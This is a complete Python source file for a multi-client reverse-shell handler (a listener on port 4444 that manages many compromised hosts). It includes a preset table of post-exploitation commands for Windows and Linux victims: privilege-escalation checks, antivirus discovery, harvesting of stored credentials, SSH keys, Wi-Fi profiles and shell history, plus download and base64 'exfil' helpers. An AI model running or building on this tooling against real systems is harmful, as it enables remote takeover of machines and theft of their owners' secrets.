#!/usr/bin/env python3
"""
Tiny multi-client TCP listener with per-connection messaging and a
proper editable prompt (backspace, arrow keys, command history).

Setup:  pip install prompt_toolkit
Run:    python3 multiserver.py [--port 4444] [--bind 0.0.0.0]

Console commands (type at the prompt):
    list                 show connected clients
    <id> <message>       send <message> to client <id>      e.g.  2 hello there
    all <message>        broadcast to every client
    kick <id>            disconnect client <id>
    os <id> <win|lin>    flag client <id>'s OS (windows / linux)
    alias                list aliases
    alias add <name> <win-cmd> ::: <lin-cmd>   define an alias
    alias del <name>     remove an alias
    run <id> <name>      run alias <name> on client <id> (OS-appropriate cmd)
    exit                 shut everything down  (Ctrl-C / Ctrl-D ignored)

Incoming data from clients prints above the prompt as:  [<id>] <data>
"""

import argparse
import os
import socket
import string
import sys
import threading
from datetime import datetime

from prompt_toolkit import PromptSession, print_formatted_text
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.shortcuts import CompleteStyle


def ts():
    """Short HH:MM:SS timestamp for log lines."""
    return datetime.now().strftime("%H:%M:%S")

HOST = "0.0.0.0"
PORT = 4444
LOG_DIR = "logs"
MAX_CONNECTIONS = 100

clients = {}          # id -> socket
addrs = {}            # id -> (ip, port)
logfiles = {}         # id -> open file handle
os_types = {}         # id -> "windows" | "linux"
next_id = 1

# name -> {"windows": cmd, "linux": cmd}. Use {0},{1},... for positional args.
aliases = {
    # identity / privilege
    "whoami":    {"windows": "whoami /all",                                                         "linux": "id"},
    "privesc":   {"windows": "whoami /priv",                                                        "linux": "sudo -l; find / -perm -4000 -type f 2>/dev/null"},

    # system info
    "sysinfo":   {"windows": "systeminfo",                                                          "linux": "uname -a; cat /etc/os-release"},
    "env":       {"windows": "set",                                                                 "linux": "env"},
    "drives":    {"windows": "wmic logicaldisk get name,size",                                      "linux": "df -h"},
    "services":  {"windows": "sc query type= running",                                              "linux": "systemctl list-units --type=service --state=running"},
    "installed": {"windows": "wmic product get name,version",                                       "linux": "dpkg -l"},
    "av":        {"windows": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname", "linux": "which clamscan; systemctl status clamav-daemon 2>/dev/null"},
    "tasks":     {"windows": "schtasks /query /fo LIST",                                            "linux": "crontab -l; ls -la /etc/cron*"},

    # network
    "net":       {"windows": "ipconfig /all",                                                       "linux": "ip a"},
    "arp":       {"windows": "arp -a",                                                              "linux": "arp -n"},
    "routes":    {"windows": "route print",                                                         "linux": "ip route"},
    "ports":     {"windows": "netstat -ano",                                                        "linux": "ss -tulpn"},
    "firewall":  {"windows": "netsh advfirewall show all",                                          "linux": "iptables -L -n"},
    "shares":    {"windows": "net share",                                                           "linux": "showmount -e"},
    "hosts":     {"windows": "type C:\\Windows\\System32\\drivers\\etc\\hosts",                     "linux": "cat /etc/hosts"},

    # users / accounts
    "users":     {"windows": "net user",                                                            "linux": "cat /etc/passwd"},
    "admins":    {"windows": "net localgroup administrators",                                       "linux": "cat /etc/group | grep -E 'sudo|wheel'"},
    "creds":     {"windows": "cmdkey /list",                                                        "linux": "cat ~/.netrc 2>/dev/null"},
    "wifi":      {"windows": "netsh wlan show profiles",                                            "linux": "nmcli -s connection show"},

    # process / activity
    "ps":        {"windows": "Get-Process",                                                         "linux": "ps aux"},
    "history":   {"windows": "Get-History",                                                         "linux": "cat ~/.bash_history"},

    # filesystem
    "pwd":       {"windows": "cd",                                                                  "linux": "pwd"},
    "ls":        {"windows": "dir",                                                                 "linux": "ls -la"},
    "ssh":       {"windows": "dir %userprofile%\\.ssh",                                             "linux": "ls ~/.ssh"},

    # transfer / exfil
    "dl":        {"windows": "iwr -Uri {0} -OutFile {1}",                                          "linux": "curl -fsSL {0} -o {1}"},
    "download":  {"windows": "iwr -Uri {0} -OutFile {1}",                                          "linux": "curl -fsSL {0} -o {1}"},
    "b64enc":    {"windows": "certutil -encode {0} con",                                            "linux": "base64 {0}"},
}
lock = threading.Lock()
log_lock = threading.Lock()
running = threading.Event()   # set while server should keep running
interact_cid = None   # client id currently in interactive mode, or None


def log_event(cid, direction, text):
    """Append one logged line for client cid. direction: '<' in, '>' out."""
    with log_lock:
        f = logfiles.get(cid)
        if f is None:
            return
        for line in text.splitlines():
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {direction} {line}\n")
        f.flush()


def recv_loop(cid, conn):
    """Print whatever a client sends, then clean up on disconnect."""
    global interact_cid
    conn.settimeout(1.0)
    try:
        while running.is_set():
            try:
                data = conn.recv(4096)
            except socket.timeout:
                continue
            if not data:
                break
            text = data.decode(errors="replace")
            log_event(cid, "<", text)
            with lock:
                interactive = (cid == interact_cid)
            if interactive:
                # write raw bytes to real stdout, bypassing patch_stdout and text encoding
                sys.__stdout__.buffer.write(data)
                sys.__stdout__.buffer.flush()
            else:
                # ANSI() passes escape codes through prompt_toolkit's output layer
                print_formatted_text(ANSI(f"[{ts()}] [{cid}] {text.rstrip()}"))
    except OSError:
        pass
    finally:
        with lock:
            was_interactive = (cid == interact_cid)
            if was_interactive:
                interact_cid = None
        if was_interactive:
            print(f"\n[*] interacted client {cid} gone, back to console")
        with lock:
            clients.pop(cid, None)
            addr = addrs.pop(cid, None)
            os_types.pop(cid, None)
        with log_lock:
            f = logfiles.pop(cid, None)
            if f is not None:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] * disconnected\n")
                f.close()
        try:
            conn.close()
        except OSError:
            pass
        print(f"[{ts()}] [*] client {cid} {addr} disconnected")


def accept_loop(srv):
    """Accept new connections forever, assigning each an id."""
    global next_id
    while running.is_set():
        try:
            conn, addr = srv.accept()
        except OSError:
            break
        with lock:
            if len(clients) >= MAX_CONNECTIONS:
                print(f"[!] connection limit ({MAX_CONNECTIONS}) reached, "
                      f"rejecting {addr[0]}:{addr[1]}")
                try:
                    conn.close()
                except OSError:
                    pass
                continue
            cid = next_id
            next_id += 1
            clients[cid] = conn
            addrs[cid] = addr
        fname = os.path.join(LOG_DIR, f"client_{cid}_{addr[0]}_{addr[1]}.log")
        try:
            f = open(fname, "a", encoding="utf-8")
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] * connected from {addr[0]}:{addr[1]}\n")
            f.flush()
            with log_lock:
                logfiles[cid] = f
        except OSError as e:
            print(f"[!] could not open log for client {cid}: {e}")
        print(f"[{ts()}] [*] client {cid} connected from {addr[0]}:{addr[1]}")
        threading.Thread(target=recv_loop, args=(cid, conn), daemon=True).start()


def send_to(cid, msg):
    with lock:
        conn = clients.get(cid)
    if conn is None:
        print(f"[!] no client with id {cid}")
        return
    try:
        conn.sendall((msg + "\n").encode())
        log_event(cid, ">", msg)
    except OSError:
        print(f"[!] failed to send to {cid}")


def _count_format_fields(fmt):
    """Count the number of positional format fields in a format string."""
    return sum(1 for _, name, _, _ in string.Formatter().parse(fmt)
               if name is not None)


def run_alias(cid, name, args=()):
    """Send the OS-appropriate command for alias <name> to client <cid>."""
    spec = aliases.get(name)
    if spec is None:
        print(f"[!] no alias '{name}' (try 'alias')")
        return
    ostype = os_types.get(cid)
    if ostype is None:
        print(f"[!] client {cid} has no OS flag; use 'os {cid} windows|linux'")
        return
    cmd = spec.get(ostype)
    if cmd is None:
        print(f"[!] alias '{name}' has no {ostype} command")
        return
    try:
        cmd = cmd.format(*args)
    except IndexError:
        needed = _count_format_fields(cmd)
        print(f"[!] alias '{name}' needs {needed} arg(s):  run {cid} {name} <arg0> [arg1 ...]")
        return
    print(f"[*] alias '{name}' -> client {cid} ({ostype}): {cmd}")
    send_to(cid, cmd)


HELP = """\
  list / ls                         show connected clients
  <id> <message>                    send message to client
  all <message>                     broadcast to all clients
  kick <id>                         disconnect client
  interact <id> / i <id>            raw passthrough mode (Ctrl-C or ~. to exit)
  os                                list OS flags
  os <id> <windows|linux>           set client OS flag
  alias                             list aliases
  alias add <name> <win> ::: <lin>  define alias
  alias del <name>                  remove alias
  run <id> <name> [arg0] [arg1] ... run alias on client ({0}/{1} substituted)
  exit / quit                       shut down server\
"""


# ---- command handlers ------------------------------------------------
# Each takes (line, parts) and returns True to continue, False to quit.

def cmd_exit(line, parts):
    return False


def cmd_help(line, parts):
    print(HELP)
    return True


def cmd_interact(line, parts):
    global interact_cid
    try:
        cid = int(parts[1])
    except (IndexError, ValueError):
        print("[!] usage: interact <id>")
        return True
    with lock:
        if cid not in clients:
            print(f"[!] no client with id {cid}")
            return True
        interact_cid = cid
    print(f"[*] interactive with client {cid}. '~.' or Ctrl-C to exit.")
    return True


def cmd_list(line, parts):
    with lock:
        if not clients:
            print("    (no clients)")
        for cid in sorted(clients):
            ip, port = addrs[cid]
            ot = os_types.get(cid, "?")
            print(f"    {cid}: {ip}:{port}  [{ot}]")
    return True


def cmd_os(line, parts):
    if len(parts) == 1:
        with lock:
            flagged = {c: os_types[c] for c in sorted(os_types)}
        if not flagged:
            print("    (no OS flags set)")
        for c, ot in flagged.items():
            print(f"    {c}: {ot}")
        return True
    if len(parts) == 3 and parts[2] in ("windows", "linux"):
        try:
            cid = int(parts[1])
        except ValueError:
            print("[!] usage: os <id> <windows|linux>")
            return True
        with lock:
            if cid not in clients:
                print(f"[!] no client with id {cid}")
                return True
            os_types[cid] = parts[2]
        print(f"[*] client {cid} flagged {parts[2]}")
        return True
    print("[!] usage: os <id> <windows|linux>")
    return True


def cmd_alias(line, parts):
    if len(parts) == 1:
        if not aliases:
            print("    (no aliases)")
        for name in sorted(aliases):
            spec = aliases[name]
            print(f"    {name}:")
            print(f"        windows: {spec.get('windows', '-')}")
            print(f"        linux:   {spec.get('linux', '-')}")
        return True
    if parts[1] == "add":
        # alias add <name> <win-cmd> ::: <lin-cmd>
        body = line.split(maxsplit=3)
        if len(body) < 4 or ":::" not in body[3]:
            print("[!] usage: alias add <name> <win-cmd> ::: <lin-cmd>")
            return True
        name = body[2]
        win_cmd, lin_cmd = (s.strip() for s in body[3].split(":::", 1))
        if not win_cmd or not lin_cmd:
            print("[!] usage: alias add <name> <win-cmd> ::: <lin-cmd>")
            return True
        aliases[name] = {"windows": win_cmd, "linux": lin_cmd}
        print(f"[*] alias '{name}' set  (windows: {win_cmd} | linux: {lin_cmd})")
        return True
    if parts[1] == "del":
        if len(parts) != 3 or parts[2] not in aliases:
            print("[!] usage: alias del <name>")
            return True
        aliases.pop(parts[2])
        print(f"[*] alias '{parts[2]}' removed")
        return True
    print("[!] usage: alias | alias add <name> <win> ::: <lin> | alias del <name>")
    return True


def cmd_run(line, parts):
    if len(parts) < 3:
        print("[!] usage: run <id> <alias> [arg0] [arg1] ...")
        return True
    try:
        cid = int(parts[1])
    except ValueError:
        print("[!] usage: run <id> <alias> [arg0] [arg1] ...")
        return True
    run_alias(cid, parts[2], parts[3:])
    return True


def cmd_all(line, parts):
    if len(parts) < 2:
        print("[!] usage: all <message>")
        return True
    msg = line[4:]
    with lock:
        ids = list(clients)
    for cid in ids:
        send_to(cid, msg)
    return True


def cmd_kick(line, parts):
    try:
        cid = int(parts[1])
    except (IndexError, ValueError):
        print("[!] usage: kick <id>")
        return True
    with lock:
        conn = clients.get(cid)
    if conn:
        # shutdown() unblocks the recv() in recv_loop so it can clean up.
        # close() alone may leave that thread blocked, esp. on Windows.
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        conn.close()
    else:
        print(f"[!] no client with id {cid}")
    return True


COMMANDS = {
    "quit":      cmd_exit,
    "exit":      cmd_exit,
    "help":      cmd_help,
    "?":         cmd_help,
    "interact":  cmd_interact,
    "i":         cmd_interact,
    "list":      cmd_list,
    "ls":        cmd_list,
    "os":        cmd_os,
    "alias":     cmd_alias,
    "run":       cmd_run,
    "all":       cmd_all,
    "kick":      cmd_kick,
}


def handle(line):
    """Process one console command. Return False to quit."""
    parts = line.split()
    if not parts:
        return True
    handler = COMMANDS.get(parts[0])
    if handler is not None:
        return handler(line, parts)
    # default: "<id> <message>"
    split2 = line.split(maxsplit=1)
    if len(split2) == 2:
        try:
            cid = int(split2[0])
        except ValueError:
            print("[!] usage: <id> <message>   (try 'list')")
            return True
        send_to(cid, split2[1])
    else:
        print("[!] usage: <id> <message>   (try 'list')")
    return True


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Multi-client TCP listener for reverse shell management"
    )
    parser.add_argument(
        "-p", "--port", type=int, default=4444,
        help="port to listen on (default: 4444)"
    )
    parser.add_argument(
        "-b", "--bind", default="0.0.0.0",
        help="address to bind to (default: 0.0.0.0)"
    )
    parser.add_argument(
        "--max-connections", type=int, default=100,
        help="maximum simultaneous connections (default: 100)"
    )
    return parser.parse_args()


def main():
    global HOST, PORT, MAX_CONNECTIONS, interact_cid

    args = parse_args()
    HOST = args.bind
    PORT = args.port
    MAX_CONNECTIONS = args.max_connections

    os.makedirs(LOG_DIR, exist_ok=True)
    running.set()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen()
    print(f"[*] listening on {HOST}:{PORT}  (max {MAX_CONNECTIONS} connections)")
    print(f"[*] commands: list, <id> <msg>, all <msg>, kick <id>, interact <id>, "
          f"os <id> <windows|linux>, alias, run <id> <alias>, help, exit")
    print(f"[*] logging per-client to ./{LOG_DIR}/")

    accept_thread = threading.Thread(target=accept_loop, args=(srv,), daemon=True)
    accept_thread.start()

    completer = WordCompleter(
        ["list", "ls", "all", "kick", "interact", "i", "os", "alias", "run", "help", "exit", "quit"],
        ignore_case=True,
    )
    session = PromptSession(
        completer=completer,
        complete_while_typing=False,
        complete_style=CompleteStyle.READLINE_LIKE,
    )
    # patch_stdout() routes all print() output (including from threads)
    # so it never corrupts the line you're editing.
    with patch_stdout():
        while True:
            with lock:
                current_cid = interact_cid
            prompt_str = f"[{current_cid}]$ " if current_cid is not None else "> "
            try:
                raw = session.prompt(prompt_str)
            except KeyboardInterrupt:
                with lock:
                    current_cid = interact_cid
                    if current_cid is not None:
                        interact_cid = None
                if current_cid is not None:
                    print(f"[*] left interactive mode (client {current_cid})")
                continue
            except EOFError:
                # Ctrl-D: ignore. Only 'exit'/'quit' shuts down.
                continue

            with lock:
                current_cid = interact_cid
            if current_cid is not None:
                # raw passthrough mode
                if raw.strip() == "~.":
                    with lock:
                        interact_cid = None
                    print(f"[*] left interactive mode (client {current_cid})")
                    continue
                send_to(current_cid, raw)
                continue

            line = raw.strip()
            if not line:
                continue
            if not handle(line):
                break

    # graceful shutdown: stop loops, unblock the accept() and every recv()
    print("[*] shutting down...")
    running.clear()
    srv.close()                       # unblocks accept_loop
    with lock:
        conns = list(clients.values())
    for conn in conns:
        # shutdown() unblocks recv_loop so each thread can flush + close its log
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            conn.close()
        except OSError:
            pass
    accept_thread.join(timeout=2)
    # close any log files whose recv_loop didn't finish in time
    with log_lock:
        for f in logfiles.values():
            try:
                f.close()
            except OSError:
                pass
        logfiles.clear()
    print("[*] shut down")


if __name__ == "__main__":
    main()
